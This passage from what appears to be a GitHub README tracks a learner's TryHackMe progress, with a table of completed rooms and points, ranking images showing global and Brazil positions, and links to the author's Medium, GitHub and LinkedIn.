|6      |Easy 🔗 - Linux Strength Training     | 5 |     98ᵗʰ  |     3ʳᵈ    |    3,172ⁿᵈ   |       47ᵗʰ     |    136,608  |    1,059    |    84     |
|4      |Medium 🚩 - JVM Reverse Engineering   | 3 |     96ᵗʰ  |     3ʳᵈ    |    3,031ˢᵗ   |       46ᵗʰ     |    136,450  |    1,058    |    84     |
|3      |Medium 🚩 - Carrotbane of My Existence| 2 |     96ᵗʰ  |     3ʳᵈ    |    3,468ᵗʰ   |       49ᵗʰ     |    136,150  |    1,057    |    84     |
|2      |Easy 🔗 - Learn Rust                  | 1 |     96ᵗʰ  |     3ʳᵈ    |    5,152ⁿᵈ   |       67ᵗʰ     |    136,030  |    1,056    |    84     |

</h6></div><br>


<p align="center">Global All Time:    87ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/6ce493d1-bc85-4d18-b767-ed6bff5f886a"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/75df8ac6-6ec4-422e-b649-ea9bbc242bda"><br><br>
                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/132ce4ff-7a56-4801-8c82-9065804ca64c"><br><br>
                  Global monthly:     189ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d1d55691-7d88-4b9a-af1c-0387c85dc260"><br><br>
                  Brazil monthly:       3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/1889f9f0-27f7-4f48-a47d-48a6d9d51da9"></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
